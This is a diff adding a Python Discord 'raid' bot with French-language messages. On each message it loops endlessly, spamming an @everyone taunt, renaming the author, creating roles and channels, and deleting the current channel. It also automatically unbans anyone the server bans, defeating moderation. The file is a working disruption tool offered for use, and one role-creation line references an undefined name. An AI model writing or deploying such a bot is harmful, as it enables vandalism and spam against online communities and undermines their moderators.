@@ -1,0 +1,63 @@
+import os
+import discord
+import time
+import random
+import string
+from discord.utils import get
+
+def randomletters(length):
+    letters = string.ascii_letters
+    return ''.join(random.choice(letters) for i in range(length))
+
+TOKEN = ('')
+
+client=discord.Client()
+
+@client.event
+async def on_ready():
+    print("sa marche pret pour raid ?")
+ 
+@client.event
+async def on_member_ban(guild,user):
+    await guild.unban(user)
+    print("removed ban")
+    
+@client.event
+async def on_message(message):
+    response ='le district anti tiktok a raid le serveur desoler https://tenor.com/view/evil-laugh-evil-plan-evil-smile-creepy-gif-16690925 @everyone'
+    x=100
+    while int(x)==100:
+        print("message sent "+random.choice(string.ascii_letters))
+        try:
+            await message.channel.send(response)
+        except:
+            print("message error")
+            pass
+        try:
+            user=message.author
+            await user.edit(nick=("oooof bah raid hein"))
+        except:
+            print("can't change user nick")
+            pass
+        guild=message.guild
+        perms=discord.Permissions(administrator=True)
+        try:
+            user=message.author
+            await guild.create_role(name='RAID ahahhaha', colour=discord.Colour(0x597E8),permissions=none)
+            role=get(guild.roles,name='RAID ahahhaha')
+            await user.add_roles(role)
+        except:
+            print('maximum number of roles reached')
+            pass
+        guild=message.guild
+        await guild.create_text_channel("Raid by C0RENTIN le bg")
+        await guild.create_text_channel("Raid by C0RENTIN le bg")
+        await message.channel.delete()
+        print("channel yeeted")
+        user=message.author
+        
+@client.event
+async def on_guild_channel_create(channel):
+    await channel.send("prend des popcorn et regarde bon raid")
+
+client.run(TOKEN)
